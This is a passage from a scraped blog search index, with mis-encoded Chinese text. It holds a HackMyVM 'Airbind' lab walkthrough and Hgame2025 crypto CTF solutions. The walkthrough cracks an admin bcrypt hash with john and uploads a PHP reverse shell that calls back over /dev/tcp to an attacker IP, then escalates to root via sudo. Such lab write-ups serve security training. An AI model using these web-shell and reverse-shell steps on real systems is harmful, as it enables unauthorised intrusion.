==\u003e DIRECTORY: http://192.168.31.156/styles/ ","date":"2025-02-23","objectID":"/vuln_hmv6/:1:2","tags":["æ¸—é€"],"title":"HMV Airbind","uri":"/vuln_hmv6/"},{"categories":["é¶åœº"],"content":"å¼¹shell dbé¡µé¢æ‰“å¼€æœ‰1ä¸ª.dbæ–‡ä»¶ï¼Œçœ‹çœ‹ï¼Œé‡Œé¢æœ‰adminå’Œå¯†ç ï¼Œçˆ†ä¸€ä¸‹ admin admin@localhost.com $$2y$10$2XxuEupev6gU1qWoURsIYu7XHNiy7nve9iq7H0mUX/MzFnmvbxC9S â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop] â””â”€$ john hash -w=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X2]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0:00:01:11 0.05% (ETA: 2025-02-24 00:13) 0g/s 129.7p/s 129.7c/s 129.7C/s rubberducky..gunit1 admin (?) 1g 0:00:02:33 DONE (2025-02-22 11:06) 0.006518g/s 129.2p/s 129.2c/s 129.2C/s bernadeth..LOVE1 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. bydå¼±å¯†ç ,ç™»å½•åˆ°ä¸»é¡µï¼Œå‘ç°æœ‰ä¸ªä¼ ä¸ªäººä¿¡æ¯çš„ï¼Œå¯ä»¥ä¼ å›¾ç‰‡ï¼Œæ‰”ä¸ªå¼¹shellè¿›å» \u003c ?php exec (\"/bin/bash -c â€˜bash -i \u003e\u0026 /dev/tcp/192.168.31.183/4444 0\u003e\u00261â€™ â€œ);?\u003e å¼¹shellæˆåŠŸ www-data@ubuntu:/var/www/html/images/uploads/logos$ sudo -l sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: ALL www-data@ubuntu:/var/www/html/images/uploads/logos$ su su Password: su: Authentication failure www-data@ubuntu:/var/www/html/images/uploads/logos$ www-data@ubuntu:/var/www/html/images/uploads/logos$ sudo su root sudo su root id uid=0(root) gid=0(root) groups=0(root) cd /root ls user.txt cat user.txt 4408f370877687429c6ab332e6f560d0 ","date":"2025-02-23","objectID":"/vuln_hmv6/:1:3","tags":["æ¸—é€"],"title":"HMV Airbind","uri":"/vuln_hmv6/"},{"categories":["é¶åœº"],"content":"ææƒ æœ¬æ¥ä»¥ä¸ºç»“æŸäº†ï¼Œç»“æœä¸å¯¹åŠ² ip açœ‹çœ‹ ip a 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0@if8: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether dc:a1:f7:82:76:13 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.0.3.241/24 brd 10.0.3.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::dea1:f7ff:fe82:7613/64 scope link valid_lft forever preferred_lft forever 3: wlan0: \u003cNO-CARRIER,BROADCAST,MULTICAST,UP\u003e mtu 1500 qdisc mq state DOWN group default qlen 1000 link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff 6: ap0: \u003cBROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 42:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff å¹¶ä¸æ˜¯ç½‘é¡µçš„ï¼Œåº”è¯¥æ˜¯docker cd /root ls -a . .. .bash_history .bashrc .lesshst .local .profile .selected_editor .sqlite_history .ssh user.txt .wpa_cli_history cd .ssh ls -a . .. id_rsa id_rsa.pub known_hosts known_hosts.old rootä¸‹é¢æœ‰sshï¼Œä½†æ˜¯ä¸Šé¢nmapçš„æ—¶å€™çœ‹è§22å·²ç»filteredäº†ï¼Œip aæœ‰ipv6ï¼Œå¯èƒ½æ˜¯ipv6ä¸Šå»ï¼Ÿ ä½¿ç”¨Â ping6Â ä¸é“¾è·¯æœ¬åœ°åœ°å€å¹¿æ’­ é€šè¿‡å‘é“¾è·¯æœ¬åœ°åœ°å€çš„ â€œæ‰€æœ‰èŠ‚ç‚¹å¤šæ’­ç»„â€ å‘é€ ICMPv6 è¯·æ±‚ï¼Œå¯ä»¥å‘ç°åŒä¸€é“¾è·¯ä¸Šçš„æ‰€æœ‰ IPv6 è®¾å¤‡ã€‚ â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop] â””â”€$ ping6 -I eth0 ff02::1 ping6: Warning: source address might be selected on device other than: eth0 PING ff02::1 (ff02::1) from :: eth0: 56 data bytes 64 bytes from fe80::1037:b3ff:febe:6938%eth0: icmp_seq=1 ttl=64 time=0.093 ms 64 bytes from fe80::cec:2f0f:8e21:5edc%eth0: icmp_seq=1 ttl=64 time=0.396 ms 64 bytes from fe80::a00:27ff:fe97:c197%eth0: icmp_seq=1 ttl=64 time=1.66 ms ä¸€ä¸ªä¸€ä¸ªè¿ï¼Œæ‹¿åˆ°root.txtï¼Œæ¡¥è¿çš„æ—¶å€™ä¼šé”™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ‰€ä»¥æ¨èæ”¹æˆnat 2bd693135712f88726c22770278a2dcf ","date":"2025-02-23","objectID":"/vuln_hmv6/:1:4","tags":["æ¸—é€"],"title":"HMV Airbind","uri":"/vuln_hmv6/"},{"categories":["CTF"],"content":"week1 ","date":"2025-02-19","objectID":"/hgame2025_crypto/:1:0","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"sieve task from Crypto.Util.number import bytes_to_long from sympy import nextprime FLAG = b'hgame{xxxxxxxxxxxxxxxxxxxxxx}' m = bytes_to_long(FLAG) def trick(k): if k \u003e 1: mul = prod(range(1,k)) if k - mul % k - 1 == 0: return euler_phi(k) + trick(k-1) + 1 else: return euler_phi(k) + trick(k-1) else: return 1 e = 65537 p = q = nextprime(trick(e^2//6)\u003c\u003c128) n = p * q enc = pow(m,e,n) print(f'{enc=}') trickè®¡ç®—çš„æ˜¯å°äºkçš„æ‰€æœ‰æ•°çš„æ¬§æ‹‰å‡½æ•°ä¹‹å’ŒåŠ ä¸Šç´ æ•°çš„ä¸ªæ•° è¿™ä¸ªk - mul % k - 1 == 0æˆç«‹ä»£è¡¨æ­¤æ—¶ä¸ºç´ æ•°(å¨å°”é€Šå®šç†) å®ç°å¯ä»¥ç”¨sageé‡Œé¢çš„phiï¼Œè¿™é‡Œéƒ½ç”¨cppå†™äº†ï¼Œå¿«ä¸€ç‚¹ #include \u003ciostream\u003e #include \u003cvector\u003e #include \u003ccmath\u003e using namespace std; typedef long long ll; int main() { ll n = 715849728; vector\u003cbool\u003e isPrime(n, true); isPrime[0] = isPrime[1] = false; // å¤„ç†2çš„å€æ•° for (ll j = 4; j \u003c n; j += 2) { isPrime[j] = false; } // åªå¤„ç†å¥‡æ•° for (ll i = 3; i * i \u003c= n; i += 2) { if (isPrime[i]) { for (ll j = i * i; j \u003c n; j += 2 * i) { isPrime[j] = false; } } } ll count = 0; for (ll i = 2; i \u003c n; i++) { if (isPrime[i]) { count++; } } cout \u003c\u003c count \u003c\u003c endl; return 0; } //37030583 #include \u003ccstdio\u003e #include \u003ciostream\u003e #define ll long long using namespace std; const int N = 1e7 + 1; ll phi[N + 10], prime[N + 10]; int tot; bool mark[N + 10]; void getphi(int n) { phi[1] = 1; for (int i = 2; i \u003c= n; i++) { if (!mark[i]) { prime[++tot] = i; phi[i] = i - 1; // æ€§è´¨1 } for (int j = 1; j \u003c= tot \u0026\u0026 i * prime[j] \u003c= n; j++) { mark[i * prime[j]] = 1; if (!(i % prime[j])) { phi[i * prime[j]] = phi[i] * prime[j]; // æ€§è´¨2 break; } else phi[i * prime[j]] = phi[i] * (prime[j] - 1); } } for (int i = 2; i \u003c= n; i++) phi[i] += phi[i - 1]; } ll work(int n) { if (n \u003c= N) return phi[n]; ll ans = 0; int pos; for (int i = 2; i \u003c= n; i = pos + 1) { pos = n / (n / i); // å‘ä¸‹å–æ•´ï¼Œå¾ˆé•¿ä¸€æ®µæ˜¯ç›¸åŒçš„ ans += (pos - i + 1) * work(n / i); } return (ll)n * (n + 1) / 2 - ans; } int main() { int n = 715849728; getphi(N); printf(\"%lld\", work(n)); return 0; } // 155763335410704472 ç„¶åå»æ±‚è§£flag from Crypto.Util.number import * from sympy import nextprime e = 65537 trick_result = 155763335410704472+37030583 p = q = nextprime(trick_result\u003c\u003c128) n=p**2 phi=p**2-p enc=2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546 d=inverse(e,phi) print(long_to_bytes(int(pow(enc,d,n)))) ","date":"2025-02-19","objectID":"/hgame2025_crypto/:1:1","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"ezbag task from Crypto.Util.number import * import random from Crypto.Cipher import AES import hashlib from Crypto.Util.Padding import pad from secrets import flag list = [] bag = [] p=random.getrandbits(64) assert len(bin(p)[2:])==64 for i in range(4): t = p a=[getPrime(32) for _ in range(64)] b=0 for i in a: temp=t%2 b+=temp*i t=t\u003e\u003e1 list.append(a) bag.append(b) print(f'list={list}') print(f'bag={bag}') key = hashlib.sha256(str(p).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) flag = pad(flag,16) ciphertext = cipher.encrypt(flag) print(f\"ciphertext={ciphertext}\") æœ¬æ¥æƒ³ç€ç›´æ¥ç”¨é€šæ€ï¼Œç›´æ¥æ„é€ è¯•è¯•ï¼Œå‘ç°å‡ºä¸æ¥ï¼Œä¼°è®¡æ˜¯å¯†åº¦é—®é¢˜ï¼Œç»™ä¸¤ç»„æ•°æ®åº”è¯¥ä¹Ÿæ˜¯å› ä¸ºè¿™ä¸ªï¼Œé‚£ä¹ˆå°±æŠŠç¬¬äºŒç»„æ•°æ®æ‰”æœ€ä¸‹é¢æ–°çš„ä¸€è¡Œï¼Œç”¨BKZå³å¯ çœ‹stoneçš„wpï¼Œå¥½åƒè¿˜æœ‰æ›´ç®€å•çš„æ–¹æ³•ï¼Œæˆ‘ä¹Ÿå†™ä¸Šæ¥ import hashlib from Crypto.Util.number import * from Crypto.Cipher import AES list= bag= ciphertext= L=Matrix(ZZ,65,68) for i in range(64): L[i,i]=2 L[i,-1]=list[0][-i-1] L[i,-2]=list[1][-i-1] L[i,-3]=list[2][-i-1] L[i,-4]=list[3][-i-1] L[-1,:]=1 L[-1,-1]=bag[0] L[-1,-2]=bag[1] L[-1,-3]=bag[2] L[-1,-4]=bag[3] x=L.BKZ() print(x[0]) p='' for i in x[0][:64]: if i==x[0][0]: p+='1' else: p+='0' p=int(p,2) key = hashlib.sha256(str(p).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) flag = cipher.decrypt(ciphertext) print(flag) ''' | | |p0 p1 ...|*|a0 a1 a2 a3| = |b0 b1 ...| | | ''' A= matrix(ZZ,list).T B= matrix(ZZ,bag) M= block_matrix(ZZ,[[1,A],[0,B]]) v = M.BKZ() a = -1*v[-1] p = int(''.join(map(str,a[:-4][::-1])),2) #17739748707559623655 key = hashlib.sha256(str(p).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) cipher.decrypt(ciphertext) ","date":"2025-02-19","objectID":"/hgame2025_crypto/:1:2","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"surperrsa å¥½åƒæ˜¯ä¸­é—´æ”¹äº†ä¸€æ¬¡é¢˜ï¼Ÿ task from Crypto.Util.number import * import random from sympy import prime FLAG=b'hgame{xxxxxxxxxxxxxxxxxx}' e=0x10001 def primorial(num): result = 1 for i in range(1, num + 1): result *= prime(i) return result M=primorial(random.choice([39,71,126])) def gen_key(): while True: k = getPrime(random.randint(20,40)) a = getPrime(random.randint(20,60)) p = k * M + pow(e, a, M) if isPrime(p): return p p,q=gen_key(),gen_key() n=p*q m=bytes_to_long(FLAG) enc=pow(m,e,n) print(f'{n=}') print(f'{enc=}') æ”¹äº†ä¹‹åå°±æ˜¯æœ€ç»å…¸çš„rocaé—®é¢˜å•¦ï¼Œç›´æ¥ç”¨è„šæœ¬ï¼Œæ”¹ä¸€ä¸‹å‚æ•°å°±è¡Œï¼Œå¾®è°ƒä¸€ä¸‹ #rocaè„šæœ¬ from Crypto.Util.number import * ## Coppersmith-howgrave def coppersmith_howgrave(f, N, beta, m, t, R): #Check if parameters are within bounds assert 0 \u003c beta \u003c= 1, 'beta not in (0, 1]' assert f.is_monic(), 'f is not monic' #get delta and the matrix dimension delta = f.degree() n = delta * m + t #Building the polynomials fZ = f.change_ring(ZZ) #change the ring from Zmod(N) to ZZ x = fZ.parent().gen() #make x a variable in ZZ f_list = [] for ii in range(m): for j in range(delta): #We want them ordered that's we have N^(m-ii1) and fZ^ii f_list.append(((x*R)^j) * N^(m-ii) * fZ(x*R)^(ii)) #the g_{i,j} for ii in range(t): f_list.append((x*R)^ii * fZ(x*R)^m) #the h_i #Build the lattice B = matrix(ZZ, n) # n = delta * m + t for ii in range(n): for j in range(ii+1): B[ii, j] = f_list[ii][j] #LLL it B_lll = B.LLL(early_red = True, use_siegel = True) #take the shortest vector to construct our new poly g g = 0 for ii in range(n): g += x^ii * B_lll[0, ii] / R^ii #factor the polynomial potential_roots = g.roots() #print('potential roots:', potential_roots) #we don't need to do this Since our we test in our roca function # #test roots # roots = [] # for r in potential_roots: # if r[0].is_integer(): # res = fZ(ZZ(r[0])) # if gcd(N, res) \u003e= N^beta: # roots.append(ZZ(r[0])) #print('roots:', roots) return potential_roots #return roots def roca(N, M_prime, g, m, t, beta): g = int(g) c_prime = discrete_log(Zmod(M_prime)(N), Zmod(M_prime)(g)) ord_M_prime = Zmod(M_prime)(g).multiplicative_order() #search boundaries bottom = c_prime // 2 top =(c_prime + ord_M_prime) // 2 print('numbers to check', top - bottom, ' between ', (bottom, top)) #constants for coppersmith P.\u003cx\u003e = PolynomialRing(Zmod(N)) epsilon = beta / 7 X = floor(2 * N^beta / M_prime) #the search for i, a in enumerate(range(bottom, top)): if i % 1000 == 0: #count iterations print(i) #construct polynomial f = x + int((inverse_mod(M_prime, N)) * int(pow(g, a, M_prime))) #roots = f.small_roots(X, beta, epsilon) #coppersmith roots = coppersmith_howgrave(f, N, beta, m, t, X) #check solutions for k_prime, _ in roots: p = int(k_prime * M_prime) + int(pow(g, a, M_prime)) if N % p == 0: return p, N//p return -1, -1 n=787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241 e=65537 def get_M1_m_t_values(key_size): if 512 \u003c= key_size \u003c 1024: m = 5 M1=0x1b3e6c9433a7735fa5fc479ffe4027e13bea elif 1024 \u003c= key_size \u003c 2048: m = 4 M1=0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e elif 2048 \u003c= key_size \u003c 3072: m = 6 M1=0x016928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6 elif 3072 \u003c= key_size \u003c 4096: m = 25 else: m = 7 return M1,m, m+1 M_prime,m, t = get_M1_m_t_values(512) p, q = roca(n, M_prime, e, m, t, .5) assert(p*q==n) print(p) print(q) enc=365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408 print(long_to_bytes(int(pow(enc,inverse_mod(e,(p-1)*(q-1)),n)))) ","date":"2025-02-19","objectID":"/hgame2025_crypto/:1:3","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"week2 ","date":"2025-02-19","objectID":"/hgame2025_crypto/:2:0","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"Ancient Recall task import random Major_Arcana = [\"The Fool\", \"The Magician\", \"The High Priestess\",\"The Empress\", \"The Emperor\", \"The Hierophant\",\"The Lovers\", \"The Chariot\", \"Strength\",\"The Hermit\", \"Wheel of Fortune\", \"Justice\",\"The Hanged Man\", \"Death\", \"Temperance\",\"The Devil\", \"The Tower\", \"The Star\",\"The Moon\", \"The Sun\", \"Judgement\",\"The World\"] wands = [\"Ace of Wands\", \"Two of Wands\", \"Three of Wands\", \"Four of Wands\", \"Five of Wands\", \"Six of Wands\", \"Seven of Wands\", \"Eight of Wands\", \"Nine of Wands\", \"Ten of Wands\", \"Page of Wands\", \"Knight of Wands\", \"Queen of Wands\", \"King of Wands\"] cups = [\"Ace of Cups\", \"Two of Cups\", \"Three of Cups\", \"Four of Cups\", \"Five of Cups\", \"Six of Cups\", \"Seven of Cups\", \"Eight of Cups\", \"Nine of Cups\", \"Ten of Cups\", \"Page of Cups\", \"Knight of Cups\", \"Queen of Cups\", \"King of Cups\"] swords = [\"Ace of Swords\", \"Two of Swords\", \"Three of Swords\", \"Four of Swords\", \"Five of Swords\", \"Six of Swords\", \"Seven of Swords\", \"Eight of Swords\", \"Nine of Swords\", \"Ten of Swords\", \"Page of Swords\", \"Knight of Swords\", \"Queen of Swords\", \"King of Swords\"] pentacles = [\"Ace of Pentacles\", \"Two of Pentacles\", \"Three of Pentacles\", \"Four of Pentacles\", \"Five of Pentacles\", \"Six of Pentacles\", \"Seven of Pentacles\", \"Eight of Pentacles\", \"Nine of Pentacles\", \"Ten of Pentacles\", \"Page of Pentacles\", \"Knight of Pentacles\", \"Queen of Pentacles\", \"King of Pentacles\"] Minor_Arcana = wands + cups + swords + pentacles tarot = Major_Arcana + Minor_Arcana reversals = [0,-1] Value = [] cards = [] YOUR_initial_FATE = [] while len(YOUR_initial_FATE)\u003c5: card = random.choice(tarot) if card not in cards: cards.append(card) if card in Major_Arcana: k = random.choice(reversals) Value.append(tarot.index(card)^k) if k == -1: YOUR_initial_FATE.append(\"re-\"+card) else: YOUR_initial_FATE.append(card) else: Value.append(tarot.index(card)) YOUR_initial_FATE.append(card) else: continue print(\"Oops!lets reverse 1T!\") FLAG=(\"hgame{\"+\"\u0026\".join(YOUR_initial_FATE)+\"}\").replace(\" \",\"_\") YOUR_final_Value = Value def Fortune_wheel(FATE): FATEd = [FATE[i]+FATE[(i+1)%5] for i in range(len(FATE))] return FATEd for i in range(250): YOUR_final_Value = Fortune_wheel(YOUR_final_Value) print(YOUR_final_Value) YOUR_final_FATE = [] for i in YOUR_final_Value: YOUR_final_FATE.append(tarot[i%78]) print(\"Your destiny changed!\\n\",\",\".join(YOUR_final_FATE)) print(\"oh,now you GET th3 GOOd lU\u003ek,^^\") \"\"\" Oops!lets reverse 1T! [2532951952066291774890498369114195917240794704918210520571067085311474675019, 2532951952066291774890327666074100357898023013105443178881294700381509795270, 2532951952066291774890554459287276604903130315859258544173068376967072335730, 2532951952066291774890865328241532885391510162611534514014409174284299139015, 2532951952066291774890830662608134156017946376309989934175833913921142609334] Your destiny changed! Eight of Cups,Ace of Cups,Strength,The Chariot,Five of Swords oh,now you GET th3 GOOd lU\u003ek,^^ \"\"\" æ„Ÿè§‰æ˜¯çº¯çº¯çš„è„šæœ¬é¢˜,ä¸Šä¸€ä¸ªæ˜¯abcdeï¼Œä¸‹ä¸€ä¸ªå°±æ˜¯a+b,b+c,c+d,d+e,e+aï¼Œé‚£ä¹ˆe+a-a-b+b+c-c-d+d+e=2eï¼Œä¸€ä¸ªä¸€ä¸ªè¿˜åŸå°±è¡Œäº† Major_Arcana = [\"The Fool\", \"The Magician\", \"The High Priestess\", \"The Empress\", \"The Emperor\", \"The Hierophant\", \"The Lovers\", \"The Chariot\", \"Strength\", \"The Hermit\", \"Wheel of Fortune\", \"Justice\", \"The Hanged Man\", \"Death\", \"Temperance\", \"The Devil\", \"The Tower\", \"The Star\", \"The Moon\", \"The Sun\", \"Judgement\", \"The World\"] Minor_Arcana = [\"Ace of Wands\", \"Two of Wands\", \"Three of Wands\", \"Four of Wands\", \"Five of Wands\", \"Six of Wands\", \"Seven of Wands\", \"Eight of Wands\", \"Nine of Wands\", \"Ten of Wands\", \"Page of Wands\", \"Knight of Wands\", \"Queen of Wands\", \"King of Wands\", \"Ace of Cups\", \"Two of Cups\", \"Three of Cups\", \"Four of Cups\", \"Five of Cups\", \"Six of Cups\", \"Seven of Cups\", \"Eight of Cups\", \"Nine of Cups\", \"Ten of Cups\", \"Page of Cups\", \"Knight of Cups\", \"Queen of Cups\", \"King of Cups\", \"Ace of Swords\", \"Two of Swords\", \"Three of Swords\", \"Four of Swords\", \"Five of Swords\", \"Six of Swords\", \"Seven of Swords\", \"Eight of Swords\", \"Nine of Swor","date":"2025-02-19","objectID":"/hgame2025_crypto/:2:1","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"Intergalactic Bound task from Crypto.Util.number import * from Crypto.Cipher import AES from Crypto.Util.Padding import pad from random import randint import hashlib from secrets import flag def add_THCurve(P, Q): if P == (0, 0): return Q if Q == (0, 0): return P x1, y1 = P x2, y2 = Q x3 = (x1 - y1 ** 2 * x2 * y2) * pow(a * x1 * y1 * x2 ** 2 - y2, -1, p) % p y3 = (y1 * y2 ** 2 - a * x1 ** 2 * x2) * pow(a * x1 * y1 * x2 ** 2 - y2, -1, p) % p return x3, y3 def mul_THCurve(n, P): R = (0, 0) while n \u003e 0: if n % 2 == 1: R = add_THCurve(R, P) P = add_THCurve(P, P) n = n // 2 return R p = getPrime(96) a = randint(1, p) G = (randint(1,p), randint(1,p)) d = (a*G[0]^3+G[1]^3+1)%p*inverse(G[0]*G[1],p)%p x = randint(1, p) Q = mul_THCurve(x, G) print(f\"p = {p}\") print(f\"G = {G}\") print(f\"Q = {Q}\") key = hashlib.sha256(str(x).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) flag = pad(flag,16) ciphertext = cipher.encrypt(flag) print(f\"ciphertext={ciphertext}\") \"\"\" p = 55099055368053948610276786301 G = (19663446762962927633037926740, 35074412430915656071777015320) Q = (26805137673536635825884330180, 26376833112609309475951186883) ciphertext=b\"k\\xe8\\xbe\\x94\\x9e\\xfc\\xe2\\x9e\\x97\\xe5\\xf3\\x04'\\x8f\\xb2\\x01T\\x06\\x88\\x04\\xeb3Jl\\xdd Pk$\\x00:\\xf5\" \"\"\" å…ˆæŠŠaæ±‚å‡ºæ¥ï¼Œåé¢ç±»ä¼¼ç¾ŠåŸæ¯, https://tangcuxiaojikuai.xyz/post/689431.html p = 55099055368053948610276786301 Gx, Gy = 19663446762962927633037926740, 35074412430915656071777015320 Qx, Qy = 26805137673536635825884330180, 26376833112609309475951186883 G = (19663446762962927633037926740, 35074412430915656071777015320) Q = (26805137673536635825884330180, 26376833112609309475951186883) ciphertext=b\"k\\xe8\\xbe\\x94\\x9e\\xfc\\xe2\\x9e\\x97\\xe5\\xf3\\x04'\\x8f\\xb2\\x01T\\x06\\x88\\x04\\xeb3Jl\\xdd Pk$\\x00:\\xf5\" from Crypto.Util.number import* numerator = ((pow(Qy,3,p)+1)*Gx*Gy - (pow(Gy,3,p)+1)*Qx*Qy) % p denominator = (pow(Gx,3,p)*Qx*Qy - pow(Qx,3,p)*Gx*Gy) % p a = (numerator * pow(denominator, -1, p)) % p print(a) a=39081810733380615260725035189 d = (a*G[0]^3+G[1]^3+1)%p*inverse(G[0]*G[1],p)%p R.\u003cx,y,z\u003e = Zmod(p)[] cubic = a*x^3 + y^3 + z^3 - d*x*y*z E = EllipticCurve_from_cubic(cubic,morphism=True) P = E(G) Q = E(Q) r = 60869967041981 m = (r*Q).log(r*P) from Crypto.Cipher import AES import hashlib key = hashlib.sha256(str(m).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) ciphertext = b\"k\\xe8\\xbe\\x94\\x9e\\xfc\\xe2\\x9e\\x97\\xe5\\xf3\\x04'\\x8f\\xb2\\x01T\\x06\\x88\\x04\\xeb3Jl\\xdd Pk$\\x00:\\xf5\" flag = cipher.decrypt(ciphertext) print(\"Flag:\", flag) ","date":"2025-02-19","objectID":"/hgame2025_crypto/:2:2","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"SPiCa task from Crypto.Util.number import getPrime, long_to_bytes,bytes_to_long from secrets import flag from sage.all import * def derive_M(n): iota=0.035 Mbits=int(2 * iota * n^2 + n * log(n,2)) M = random_prime(2^Mbits, proof = False, lbound = 2^(Mbits - 1)) return Integer(M) m = bytes_to_long(flag).bit_length() n = 70 p = derive_M(n) F = GF(p) x = random_matrix(F, 1, n) A = random_matrix(ZZ, n, m, x=0, y=2) A[randint(0, n-1)] = vector(ZZ, list(bin(bytes_to_long(flag))[2:])) h = x*A with open(\"data.txt\", \"w\") as file: file.write(str(m) + \"\\n\") file.write(str(p) + \"\\n\") for item in h: file.write(str(item) + \"\\n\") æ˜¯ä¸€ä¸ªhsspé—®é¢˜ï¼Œç”¨çš„https://0xffff.one/d/2077/6 ,æ²¡å’‹ç†è§£ï¼Œä½†æ˜¯ä¼šå†™é¢˜å•¦èµ·ç ï¼ˆï¼‰ from Crypto.Util.number import * import logging logging.basicConfig( level=logging.DEBUG, format=\"[%(levelname)s] %(message)s\" ) # https://github.com/Neobeo/HackTM2023/blob/main/solve420.sage # faster LLL reduction to replace `M.LLL()` wiith `flatter(M)` def flatter(M, **kwds): from subprocess import check_output from re import findall M = matrix(ZZ,M) # compile https://github.com/keeganryan/flatter and put it in [imath:0]PATH z = '[[' + ']\\n['.join(' '.join(map(str,row)) for row in M) + ']]' ret = check_output([\"flatter\"], input=z.encode()) return matrix(M.nrows(), M.ncols(), map(int,findall(b'-?\\\\d+', ret))) def checkMatrix(M, wl=[-1, 1]): M = [list(_) for _ in list(M)] ml = list(set(flatten(M))) logging.debug(ml) return sorted(ml) == sorted(wl) def Nguyen_Stern(h, m, n, M): B = matrix(ZZ, m) B[0, 0] = M h0i = Integer(h[0]).inverse_mod(M) for i in range(1, m): B[i, 0] = - h[i] * h0i B[i, i] = 1 #L = B.BKZ() # slooooooow L = flatter(B) logging.info('flatter done.') ''' vh = vector(Zmod(M), h) logging.debug([vector(Zmod(M), list(l)) * vh for l in L]) ''' Lxo = matrix(ZZ, L[:m-n]) Lxc = Lxo.right_kernel(algorithm='pari').matrix() # faster logging.info('right_kernel done.') ''' try: Lx_real = matrix(ZZ, [xi + [0] * (m - len(xi)) for xi in X]) rsc = Lxc.row_space() logging.debug([xi in rsc for xi in Lx_real]) except: pass ''' e = matrix(ZZ, [1] * m) B = block_matrix([[-e], [2*Lxc]]) Lx = B.BKZ() logging.info('BKZ done.') assert checkMatrix(Lx) assert len(set(Lx[0])) == 1 Lx = Lx[1:] E = matrix(ZZ, [[1 for c in range(Lxc.ncols())] for r in range(Lxc.nrows())]) Lx = (Lx + E) / 2 Lx2 = [] e = vector(ZZ, [1] * m) rsc = Lxc.row_space() for lx in Lx: if lx in rsc: Lx2 += [lx] continue lx = e - lx if lx in rsc: Lx2 += [lx] continue logging.warning('Something wrong?') Lx = matrix(Zmod(M), Lx2) vh = vector(Zmod(M), h) va = Lx.solve_left(vh) return Lx, va m=247 n=70 M= h= Lx, va = Nguyen_Stern(h, m, n, M) for i in Lx: flag='' for j in i: flag+=str(j) flag=long_to_bytes(int(flag,2)) if b'hgame' in flag: print(flag) ","date":"2025-02-19","objectID":"/hgame2025_crypto/:2:3","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"æ€»ç»“ é¢˜ç›®è´¨é‡çœŸçš„æŒºé«˜çš„ï¼Œæœ‰äº›é¢˜ç¬¬ä¸€å¼€å§‹ä¸ä¼šå†™ï¼Œæƒ³äº†å¥½å¤šæ‰å‘ç°è‡ªå·±æ˜¯zzï¼Œè¢«è‡ªå·±è ¢å“­äº† ","date":"2025-02-19","objectID":"/hgame2025_crypto/:3:0","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["é¶åœº"],"content":"VivifyTech ","date":"2025-02-18","objectID":"/vuln_hmv5/:1:0","tags":["æ¸—é€"],"title":"HMV VivifyTech","uri":"/vuln_hmv5/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=VivifyTech ","date":"2025-02-18","objectID":"/vuln_hmv5/:1:1","tags":["æ¸—é€"],"title":"HMV VivifyTech","uri":"/vuln_hmv5/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.64.3 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.64.1 16:7f:ce:9b:a1:64 (Unknown: locally administered) 192.168.64.23 de:be:f3:07:14:ee (Unknown: locally administered) 2 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.867 seconds (137.12 hosts/sec). 2 responded â”Œâ”€â”€(kaliã‰¿kali)-[~] 